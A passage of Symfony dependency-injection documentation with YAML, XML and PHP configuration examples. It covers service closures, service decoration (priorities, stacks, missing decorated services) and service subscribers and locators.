                <service id="App\Service\MyService">
                    <argument type="service_closure" id="mailer"/>

                    <!--
                    In case the dependency is optional
                    <argument type="service_closure" id="mailer" on-invalid="ignore"/>
                    -->
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\MyService;

        return function (ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(MyService::class)
                ->args([service_closure('mailer')]);

            // In case the dependency is optional
            // $services->set(MyService::class)
            //     ->args([service_closure('mailer')->ignoreOnInvalid()]);
        };

.. seealso::

    Service closures can be injected :ref:`by using autowiring <autowiring_closures>`
    and its dedicated attributes.

.. seealso::

    Another way to inject services lazily is via a
    :doc:`service locator </service_container/service_subscribers_locators>`.

Using a Service Closure in a Compiler Pass
------------------------------------------

In :doc:`compiler passes </service_container/compiler_passes>` you can create
a service closure by wrapping the service reference into an instance of
:class:`Symfony\\Component\\DependencyInjection\\Argument\\ServiceClosureArgument`::

    use Symfony\Component\DependencyInjection\Argument\ServiceClosureArgument;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Reference;

    public function process(ContainerBuilder $container): void
    {
        // ...

        $myService->addArgument(new ServiceClosureArgument(new Reference('mailer')));
    }
How to Decorate Services
========================

When overriding an existing definition, the original service is lost:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Mailer: ~

            # this replaces the old App\Mailer definition with the new one, the
            # old definition is lost
            App\Mailer:
                class: App\NewMailer

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema-instance"
            xsd:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Mailer"/>

                <!-- this replaces the old App\Mailer definition with the new
                     one, the old definition is lost -->
                <service id="App\Mailer" class="App\NewMailer"/>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Mailer;
        use App\NewMailer;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(Mailer::class);

            // this replaces the old App\Mailer definition with the new one, the
            // old definition is lost
            $services->set(Mailer::class, NewMailer::class);
        };

Most of the time, that's exactly what you want to do. But sometimes,
you might want to decorate the old one instead (i.e. apply the `Decorator pattern`_).
In this case, the old service should be kept around to be able to reference
it in the new one. This configuration replaces ``App\Mailer`` with a new one,
but keeps a reference of the old one as ``.inner``:

.. configuration-block::

    .. code-block:: php-attributes

        // src/DecoratingMailer.php
        namespace App;

        // ...
        use Symfony\Component\DependencyInjection\Attribute\AsDecorator;

        #[AsDecorator(decorates: Mailer::class)]
        class DecoratingMailer
        {
            // ...
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Mailer: ~

            App\DecoratingMailer:
                # overrides the App\Mailer service
                # but that service is still available as ".inner"
                decorates: App\Mailer

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema-instance"
            xsd:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Mailer"/>

                <!-- overrides the App\Mailer service
                     but that service is still available as ".inner" -->
                <service id="App\DecoratingMailer"
                    decorates="App\Mailer"
                />

            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\DecoratingMailer;
        use App\Mailer;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(Mailer::class);

            $services->set(DecoratingMailer::class)
                // overrides the App\Mailer service
                // but that service is still available as ".inner"
                ->decorate(Mailer::class);
        };

The ``decorates`` option tells the container that the ``App\DecoratingMailer``
service replaces the ``App\Mailer`` service. If you're using the
:ref:`default services.yaml configuration <service-container-services-load-example>`,
the decorated service is automatically injected when the constructor of the
decorating service has one argument type-hinted with the decorated service class.

If you are not using autowiring or the decorating service has more than one
constructor argument type-hinted with the decorated service class, you must
inject the decorated service explicitly (the ID of the decorated service is
automatically changed to ``'.inner'``):

.. configuration-block::

    .. code-block:: php-attributes

        // src/DecoratingMailer.php
        namespace App;

        // ...
        use Symfony\Component\DependencyInjection\Attribute\AsDecorator;
        use Symfony\Component\DependencyInjection\Attribute\AutowireDecorated;

        #[AsDecorator(decorates: Mailer::class)]
        class DecoratingMailer
        {
            public function __construct(
                #[AutowireDecorated]
                private object $inner,
            ) {
            }

            // ...
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Mailer: ~

            App\DecoratingMailer:
                decorates: App\Mailer
                # pass the old service as an argument
                arguments: ['@.inner']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema-instance"
            xsd:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Mailer"/>

                <service id="App\DecoratingMailer"
                    decorates="App\Mailer"
                >
                    <!-- pass the old service as an argument -->
                    <argument type="service" id=".inner"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\DecoratingMailer;
        use App\Mailer;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(Mailer::class);

            $services->set(DecoratingMailer::class)
                ->decorate(Mailer::class)
                // pass the old service as an argument
                ->args([service('.inner')]);
        };

.. tip::

    The visibility of the decorated ``App\Mailer`` service (which is an alias
    for the new service) will still be the same as the original ``App\Mailer``
    visibility.

.. note::

    The generated inner id is based on the id of the decorator service
    (``App\DecoratingMailer`` here), not of the decorated service (``App\Mailer``
    here). You can control the inner service name via the ``decoration_inner_name``
    option:

    .. configuration-block::

        .. code-block:: yaml

            # config/services.yaml
            services:
                App\DecoratingMailer:
                    # ...
                    decoration_inner_name: App\DecoratingMailer.wooz
                    arguments: ['@App\DecoratingMailer.wooz']

        .. code-block:: xml

            <!-- config/services.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsd="http://www.w3.org/2001/XMLSchema-instance"
                xsd:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

                <services>
                    <!-- ... -->

                    <service
                        id="App\DecoratingMailer"
                        decorates="App\Mailer"
                        decoration-inner-name="App\DecoratingMailer.wooz"
                        public="false"
                    >
                        <argument type="service" id="App\DecoratingMailer.wooz"/>
                    </service>

                </services>
            </container>

        .. code-block:: php

            // config/services.php
            namespace Symfony\Component\DependencyInjection\Loader\Configurator;

            use App\DecoratingMailer;
            use App\Mailer;

            return function(ContainerConfigurator $container): void {
                $services = $container->services();

                $services->set(Mailer::class);

                $services->set(DecoratingMailer::class)
                    ->decorate(Mailer::class, DecoratingMailer::class.'.wooz')
                    ->args([service(DecoratingMailer::class.'.wooz')]);
            };

Decoration Priority
-------------------

When applying multiple decorators to a service, you can control their order with
the ``decoration_priority`` option. Its value is an integer that defaults to
``0`` and higher priorities mean that decorators will be applied earlier.

.. configuration-block::

        .. code-block:: php-attributes

            // ...
            use Symfony\Component\DependencyInjection\Attribute\AsDecorator;
            use Symfony\Component\DependencyInjection\Attribute\AutowireDecorated;

            #[AsDecorator(decorates: Foo::class, priority: 5)]
            class Bar
            {
                public function __construct(
                    #[AutowireDecorated]
                    private $inner,
                ) {
                }
                // ...
            }

            #[AsDecorator(decorates: Foo::class, priority: 1)]
            class Baz
            {
                public function __construct(
                    #[AutowireDecorated]
                    private $inner,
                ) {
                }

                // ...
            }

    .. code-block:: yaml

        # config/services.yaml
        services:
            Foo: ~

            Bar:
                decorates: Foo
                decoration_priority: 5
                arguments: ['@.inner']

            Baz:
                decorates: Foo
                decoration_priority: 1
                arguments: ['@.inner']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>

        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="Foo"/>

                <service id="Bar" decorates="Foo" decoration-priority="5">
                    <argument type="service" id=".inner"/>
                </service>

                <service id="Baz" decorates="Foo" decoration-priority="1">
                    <argument type="service" id=".inner"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(\Foo::class);

            $services->set(\Bar::class)
                ->decorate(\Foo::class, null, 5)
                ->args([service('.inner')]);

            $services->set(\Baz::class)
                ->decorate(\Foo::class, null, 1)
                ->args([service('.inner')]);
        };

The generated code will be the following::

    $this->services[Foo::class] = new Baz(new Bar(new Foo()));

Stacking Decorators
-------------------

An alternative to using decoration priorities is to create a ``stack`` of
ordered services, each one decorating the next:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            decorated_foo_stack:
                stack:
                    - class: Baz
                      arguments: ['@.inner']
                    - class: Bar
                      arguments: ['@.inner']
                    - class: Foo

            # using the short syntax:
            decorated_foo_stack:
                stack:
                    - Baz: ['@.inner']
                    - Bar: ['@.inner']
                    - Foo: ~

            # can be simplified when autowiring is enabled:
            decorated_foo_stack:
                stack:
                    - Baz: ~
                    - Bar: ~
                    - Foo: ~

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd"
        >
            <services>
                <stack id="decorated_foo_stack">
                    <service class="Baz">
                        <argument type="service" id=".inner"/>
                    </service>
                    <service class="Bar">
                        <argument type="service" id=".inner"/>
                    </service>
                    <service class="Foo"/>
                </stack>

                <!-- can be simplified when autowiring is enabled: -->
                <stack id="decorated_foo_stack">
                    <service class="Baz"/>
                    <service class="Bar"/>
                    <service class="Foo"/>
                </stack>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return function(ContainerConfigurator $container): void {
            $container->services()
                ->stack('decorated_foo_stack', [
                    inline_service(\Baz::class)->args([service('.inner')]),
                    inline_service(\Bar::class)->args([service('.inner')]),
                    inline_service(\Foo::class),
                ])

                // can be simplified when autowiring is enabled:
                ->stack('decorated_foo_stack', [
                    inline_service(\Baz::class),
                    inline_service(\Bar::class),
                    inline_service(\Foo::class),
                ])
            ;
        };

The result will be the same as in the previous section::

    $this->services['decorated_foo_stack'] = new Baz(new Bar(new Foo()));

Like aliases, a ``stack`` can only use ``public`` and ``deprecated`` attributes.

Each frame of the ``stack`` can be either an inlined service, a reference or a
child definition.
The latter allows embedding ``stack`` definitions into each others, here's an
advanced example of composition:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            some_decorator:
                class: App\Decorator

            embedded_stack:
                stack:
                    - alias: some_decorator
                    - App\Decorated: ~

            decorated_foo_stack:
                stack:
                    - parent: embedded_stack
                    - Baz: ~
                    - Bar: ~
                    - Foo: ~

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd"
        >
            <services>
                <service id="some_decorator" class="App\Decorator"/>

                <stack id="embedded_stack">
                    <service alias="some_decorator"/>
                    <service class="App\Decorated"/>
                </stack>

                <stack id="decorated_foo_stack">
                    <service parent="embedded_stack"/>
                    <service class="Baz"/>
                    <service class="Bar"/>
                    <service class="Foo"/>
                </stack>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Decorated;
        use App\Decorator;

        return function(ContainerConfigurator $container): void {
            $container->services()
                ->set('some_decorator', Decorator::class)

                ->stack('embedded_stack', [
                    service('some_decorator'),
                    inline_service(Decorated::class),
                ])

                ->stack('decorated_foo_stack', [
                    inline_service()->parent('embedded_stack'),
                    inline_service(\Baz::class),
                    inline_service(\Bar::class),
                    inline_service(\Foo::class),
                ])
            ;
        };

The result will be::

    $this->services['decorated_foo_stack'] = new App\Decorator(new App\Decorated(new Baz(new Bar(new Foo()))));

.. note::

    To change existing stacks (i.e. from a compiler pass), you can access each
    frame by its generated id with the following structure:
    ``.stack_id.frame_key``.
    From the example above, ``.decorated_foo_stack.1`` would be a reference to
    the inlined ``Baz`` service and ``.decorated_foo_stack.0`` to the embedded
    stack.
    To get more explicit ids, you can give a name to each frame:

    .. configuration-block::

        .. code-block:: yaml

            # ...
            decorated_foo_stack:
                stack:
                    first:
                        parent: embedded_stack
                    second:
                        Baz: ~
                    # ...

        .. code-block:: xml

            <!-- ... -->
            <stack id="decorated_foo_stack">
                <service id="first" parent="embedded_stack"/>
                <service id="second" class="Baz"/>
                <!-- ... -->
            </stack>

        .. code-block:: php

            // ...
            ->stack('decorated_foo_stack', [
                'first' => inline_service()->parent('embedded_stack'),
                'second' => inline_service(\Baz::class),
                // ...
            ])

    The ``Baz`` frame id will now be ``.decorated_foo_stack.second``.

Control the Behavior When the Decorated Service Does Not Exist
--------------------------------------------------------------

When you decorate a service that doesn't exist, the ``decoration_on_invalid``
option allows you to choose the behavior to adopt.

Three different behaviors are available:

* ``exception``: A ``ServiceNotFoundException`` will be thrown telling that decorator's dependency is missing. (default)
* ``ignore``: The container will remove the decorator.
* ``null``: The container will keep the decorator service and will set the decorated one to ``null``.

.. configuration-block::

        .. code-block:: php-attributes

            // ...
            use Symfony\Component\DependencyInjection\Attribute\AsDecorator;
            use Symfony\Component\DependencyInjection\Attribute\AutowireDecorated;
            use Symfony\Component\DependencyInjection\ContainerInterface;

            #[AsDecorator(decorates: Mailer::class, onInvalid: ContainerInterface::IGNORE_ON_INVALID_REFERENCE)]
            class Bar
            {
                public function __construct(
                    private #[AutowireDecorated] $inner,
                ) {
                }

                // ...
            }

    .. code-block:: yaml

        # config/services.yaml
        Foo: ~

        Bar:
            decorates: Foo
            decoration_on_invalid: ignore
            arguments: ['@.inner']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>

        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="Foo"/>

                <service id="Bar" decorates="Foo" decoration-on-invalid="ignore">
                    <argument type="service" id=".inner"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Symfony\Component\DependencyInjection\ContainerInterface;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(Foo::class);

            $services->set(Bar::class)
                ->decorate(Foo::class, null, 0, ContainerInterface::IGNORE_ON_INVALID_REFERENCE)
                ->args([service('.inner')])
            ;
        };

.. caution::

    When using ``null``, you may have to update the decorator constructor in
    order to make decorated dependency nullable::

        // src/Service/DecoratorService.php
        namespace App\Service;

        use Acme\OptionalBundle\Service\OptionalService;

        class DecoratorService
        {
            public function __construct(
                private ?OptionalService $decorated,
            ) {
            }

            public function tellInterestingStuff(): string
            {
                if (!$this->decorated) {
                    return 'Just one interesting thing';
                }

                return $this->decorated->tellInterestingStuff().' + one more interesting thing';
            }
        }

.. note::

    Sometimes, you may want to add a compiler pass that creates service
    definitions on the fly. If you want to decorate such a service,
    be sure that your compiler pass is registered with ``PassConfig::TYPE_BEFORE_OPTIMIZATION``
    type so that the decoration pass will be able to find the created services.

.. _`Decorator pattern`: https://en.wikipedia.org/wiki/Decorator_pattern
.. _service-locators:

Service Subscribers & Locators
==============================

Sometimes, a service needs access to several other services without being sure
that all of them will actually be used. In those cases, you may want the
instantiation of the services to be lazy. However, that's not possible using
the explicit dependency injection since services are not all meant to
be ``lazy`` (see :doc:`/service_container/lazy_services`).

.. seealso::

    Another way to inject services lazily is via a
    :doc:`service closure </service_container/service_closures>`.

This can typically be the case in your controllers, where you may inject several
services in the constructor, but the action called only uses some of them.
Another example are applications that implement the `Command pattern`_
using a CommandBus to map command handlers by Command class names and use them
to handle their respective command when it is asked for::

    // src/CommandBus.php
    namespace App;

    // ...
    class CommandBus
    {
        /**
         * @param CommandHandler[] $handlerMap
         */
        public function __construct(
            private array $handlerMap,
        ) {
        }

        public function handle(Command $command): mixed
        {
            $commandClass = get_class($command);

            if (!$handler = $this->handlerMap[$commandClass] ?? null) {
                return;
            }

            return $handler->handle($command);
        }
    }

    // ...
    $commandBus->handle(new FooCommand());

Considering that only one command is handled at a time, instantiating all the
other command handlers is unnecessary. A possible solution to lazy-load the
handlers could be to inject the main dependency injection container.

However, injecting the entire container is discouraged because it gives too
broad access to existing services and it hides the actual dependencies of the
services. Doing so also requires services to be made public, which isn't the
case by default in Symfony applications.

**Service Subscribers** are intended to solve this problem by giving access to a
set of predefined services while instantiating them only when actually needed
through a **Service Locator**, a separate lazy-loaded container.

Defining a Service Subscriber
-----------------------------

First, turn ``CommandBus`` into an implementation of :class:`Symfony\\Contracts\\Service\\ServiceSubscriberInterface`.
Use its ``getSubscribedServices()`` method to include as many services as needed
in the service subscriber::

    // src/CommandBus.php
    namespace App;

    use App\CommandHandler\BarHandler;
    use App\CommandHandler\FooHandler;
    use Psr\Container\ContainerInterface;
    use Symfony\Contracts\Service\ServiceSubscriberInterface;

    class CommandBus implements ServiceSubscriberInterface
    {
        public function __construct(
            private ContainerInterface $locator,
        ) {
        }

        public static function getSubscribedServices(): array
        {
            return [
                'App\FooCommand' => FooHandler::class,
                'App\BarCommand' => BarHandler::class,
            ];
        }

        public function handle(Command $command): mixed
        {
            $commandClass = get_class($command);

            if ($this->locator->has($commandClass)) {
                $handler = $this->locator->get($commandClass);

                return $handler->handle($command);
            }
        }
    }

.. tip::

    If the container does *not* contain the subscribed services, double-check
    that you have :ref:`autoconfigure <services-autoconfigure>` enabled. You
    can also manually add the ``container.service_subscriber`` tag.

A service locator is a `PSR-11 container`_ that contains a set of services,
but only instantiates them when they are actually used. Consider the following code::

    // ...
    $handler = $this->locator->get($commandClass);

    return $handler->handle($command);

In this example, the ``$handler`` service is only instantiated when the
``$this->locator->get($commandClass)`` method is called.

You can also type-hint the service locator argument with
:class:`Symfony\\Contracts\\Service\\ServiceCollectionInterface` instead of
``Psr\Container\ContainerInterface``. By doing so, you'll be able to
count and iterate over the services of the locator::

    // ...
    $numberOfHandlers = count($this->locator);
    $nameOfHandlers = array_keys($this->locator->getProvidedServices());

    // you can iterate through all services of the locator
    foreach ($this->locator as $serviceId => $service) {
        // do something with the service, the service id or both
    }

.. versionadded:: 7.1

    The :class:`Symfony\\Contracts\\Service\\ServiceCollectionInterface` was
    introduced in Symfony 7.1.

Including Services
------------------

In order to add a new dependency to the service subscriber, use the
``getSubscribedServices()`` method to add service types to include in the
service locator::

    use Psr\Log\LoggerInterface;

    public static function getSubscribedServices(): array
    {
        return [
            // ...
            LoggerInterface::class,
        ];
    }

Service types can also be keyed by a service name for internal use::

    use Psr\Log\LoggerInterface;

    public static function getSubscribedServices(): array
    {
        return [
            // ...
            'logger' => LoggerInterface::class,
        ];
    }

When extending a class that also implements ``ServiceSubscriberInterface``,
it's your responsibility to call the parent when overriding the method. This
typically happens when extending ``AbstractController``::

    use Psr\Log\LoggerInterface;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

    class MyController extends AbstractController
    {
        public static function getSubscribedServices(): array
        {
            return array_merge(parent::getSubscribedServices(), [
                // ...
                'logger' => LoggerInterface::class,
            ]);
        }
    }

Optional Services
~~~~~~~~~~~~~~~~~

For optional dependencies, prepend the service type with a ``?`` to prevent
errors if there's no matching service found in the service container::

    use Psr\Log\LoggerInterface;

    public static function getSubscribedServices(): array
    {
        return [
            // ...
            '?'.LoggerInterface::class,
        ];
    }

.. note::

    Make sure an optional service exists by calling ``has()`` on the service
    locator before calling the service itself.

Aliased Services
~~~~~~~~~~~~~~~~

By default, autowiring is used to match a service type to a service from the
service container. If you don't use autowiring or need to add a non-traditional
service as a dependency, use the ``container.service_subscriber`` tag to map a
service type to a service.

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\CommandBus:
                tags:
                    - { name: 'container.service_subscriber', key: 'logger', id: 'monolog.logger.event' }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>

                <service id="App\CommandBus">
                    <tag name="container.service_subscriber" key="logger" id="monolog.logger.event"/>
                </service>

            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\CommandBus;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(CommandBus::class)
                ->tag('container.service_subscriber', ['key' => 'logger', 'id' => 'monolog.logger.event']);
        };

.. tip::

    The ``key`` attribute can be omitted if the service name internally is the
    same as in the service container.

Add Dependency Injection Attributes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

As an alternate to aliasing services in your configuration, you can also configure
the following dependency injection attributes in the ``getSubscribedServices()``
method directly:

* :class:`Symfony\\Component\\DependencyInjection\\Attribute\\Autowire`
* :class:`Symfony\\Component\\DependencyInjection\\Attribute\\TaggedIterator`
* :class:`Symfony\\Component\\DependencyInjection\\Attribute\\TaggedLocator`
* :class:`Symfony\\Component\\DependencyInjection\\Attribute\\Target`
* :class:`Symfony\\Component\\DependencyInjection\\Attribute\\AutowireDecorated`

This is done by having ``getSubscribedServices()`` return an array of
:class:`Symfony\\Contracts\\Service\\Attribute\\SubscribedService` objects
(these can be combined with standard ``string[]`` values)::

    use Psr\Container\ContainerInterface;
    use Psr\Log\LoggerInterface;
    use Symfony\Component\DependencyInjection\Attribute\Autowire;
    use Symfony\Component\DependencyInjection\Attribute\TaggedIterator;
    use Symfony\Component\DependencyInjection\Attribute\TaggedLocator;
    use Symfony\Component\DependencyInjection\Attribute\Target;
    use Symfony\Contracts\Service\Attribute\SubscribedService;

    public static function getSubscribedServices(): array
    {
        return [
            // ...
            new SubscribedService('logger', LoggerInterface::class, attributes: new Autowire(service: 'monolog.logger.event')),

            // can event use parameters
            new SubscribedService('env', 'string', attributes: new Autowire('%kernel.environment%')),

            // Target
            new SubscribedService('event.logger', LoggerInterface::class, attributes: new Target('eventLogger')),

            // TaggedIterator
            new SubscribedService('loggers', 'iterable', attributes: new TaggedIterator('logger.tag')),

            // TaggedLocator
            new SubscribedService('handlers', ContainerInterface::class, attributes: new TaggedLocator('handler.tag')),
        ];
    }

.. note::

    The above example requires using ``3.2`` version or newer of ``symfony/service-contracts``.

.. _service-locator_autowire-locator:
.. _service-locator_autowire-iterator:

The AutowireLocator and AutowireIterator Attributes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Another way to define a service locator is to use the
:class:`Symfony\\Component\\DependencyInjection\\Attribute\\AutowireLocator`
attribute::

    // src/CommandBus.php
    namespace App;

    use App\CommandHandler\BarHandler;
    use App\CommandHandler\FooHandler;
    use Psr\Container\ContainerInterface;
    use Symfony\Component\DependencyInjection\Attribute\AutowireLocator;

    class CommandBus
    {
        public function __construct(
            #[AutowireLocator([
                FooHandler::class,
                BarHandler::class,
            ])]
            private ContainerInterface $handlers,
        ) {
        }

        public function handle(Command $command): mixed
        {
            $commandClass = get_class($command);

            if ($this->handlers->has($commandClass)) {
                $handler = $this->handlers->get($commandClass);

                return $handler->handle($command);
            }
        }
    }

Just like with the ``getSubscribedServices()`` method, it is possible
to define aliased services thanks to the array keys, as well as optional
services, plus you can nest it with
:class:`Symfony\\Contracts\\Service\\Attribute\\SubscribedService`
attribute::

    // src/CommandBus.php
    namespace App;

    use App\CommandHandler\BarHandler;
    use App\CommandHandler\BazHandler;
    use App\CommandHandler\FooHandler;
    use Psr\Container\ContainerInterface;
    use Symfony\Component\DependencyInjection\Attribute\Autowire;
    use Symfony\Component\DependencyInjection\Attribute\AutowireLocator;
    use Symfony\Contracts\Service\Attribute\SubscribedService;

    class CommandBus
    {
        public function __construct(
            #[AutowireLocator([
                'foo' => FooHandler::class,
                'bar' => new SubscribedService(type: 'string', attributes: new Autowire('%some.parameter%')),
                'optionalBaz' => '?'.BazHandler::class,
            ])]
            private ContainerInterface $handlers,
        ) {
        }

        public function handle(Command $command): mixed
        {
            $fooHandler = $this->handlers->get('foo');

            // ...
        }
    }

.. note::

    To receive an iterable instead of a service locator, you can switch the
    :class:`Symfony\\Component\\DependencyInjection\\Attribute\\AutowireLocator`
    attribute to
    :class:`Symfony\\Component\\DependencyInjection\\Attribute\\AutowireIterator`
    attribute.

.. _service-subscribers-locators_defining-service-locator:

Defining a Service Locator
--------------------------

To manually define a service locator and inject it to another service, create an
argument of type ``service_locator``.

Consider the following ``CommandBus`` class where you want to inject
some services into it via a service locator::

    // src/CommandBus.php
    namespace App;

    use Psr\Container\ContainerInterface;

    class CommandBus
    {
        public function __construct(
            private ContainerInterface $locator,
        ) {
        }
    }

Symfony allows you to inject the service locator using YAML/XML/PHP configuration
or directly via PHP attributes:

.. configuration-block::

    .. code-block:: php-attributes

        // src/CommandBus.php
        namespace App;

        use Psr\Container\ContainerInterface;
        use Symfony\Component\DependencyInjection\Attribute\TaggedLocator;

        class CommandBus
        {
            public function __construct(
                // creates a service locator with all the services tagged with 'app.handler'
                #[TaggedLocator('app.handler')]
                private ContainerInterface $locator,
            ) {
            }
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\CommandBus:
                arguments:
                  - !service_locator
                      App\FooCommand: '@app.command_handler.foo'
                      App\BarCommand: '@app.command_handler.bar'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\CommandBus">
                    <argument type="service_locator">
                        <argument key="App\FooCommand" type="service" id="app.command_handler.foo"/>
                        <argument key="App\BarCommand" type="service" id="app.command_handler.bar"/>
                    </argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\CommandBus;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(CommandBus::class)
                ->args([service_locator([
                    'App\FooCommand' => service('app.command_handler.foo'),
                    'App\BarCommand' => service('app.command_handler.bar'),
                ])]);
        };

As shown in the previous sections, the constructor of the ``CommandBus`` class
must type-hint its argument with ``ContainerInterface``. Then, you can get any of
the service locator services via their ID (e.g. ``$this->locator->get('App\FooCommand')``).

Reusing a Service Locator in Multiple Services
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you inject the same service locator in several services, it's better to
define the service locator as a stand-alone service and then inject it in the
other services. To do so, create a new service definition using the
``ServiceLocator`` class:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            app.command_handler_locator:
                class: Symfony\Component\DependencyInjection\ServiceLocator
                arguments:
                    -
                        App\FooCommand: '@app.command_handler.foo'
                        App\BarCommand: '@app.command_handler.bar'
                # if you are not using the default service autoconfiguration,
                # add the following tag to the service definition:
                # tags: ['container.service_locator']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>

                <service id="app.command_handler_locator" class="Symfony\Component\DependencyInjection\ServiceLocator">
                    <argument type="collection">
                        <argument key="App\FooCommand" type="service" id="app.command_handler.foo"/>
                        <argument key="App\BarCommand" type="service" id="app.command_handler.bar"/>
                    </argument>
                    <!--
                        if you are not using the default service autoconfiguration,
                        add the following tag to the service definition:
                        <tag name="container.service_locator"/>
                    -->
                </service>

            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Symfony\Component\DependencyInjection\ServiceLocator;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set('app.command_handler_locator', ServiceLocator::class)
                ->args([[
                    'App\FooCommand' => service('app.command_handler.foo'),
                    'App\BarCommand' => service('app.command_handler.bar'),
                ]])
                // if you are not using the default service autoconfiguration,
                // add the following tag to the service definition:
                // ->tag('container.service_locator')
            ;
        };

.. note::

    The services defined in the service locator argument must include keys,
    which later become their unique identifiers inside the locator.

Now you can inject the service locator in any other services:

.. configuration-block::

    .. code-block:: php-attributes

        // src/CommandBus.php
        namespace App;

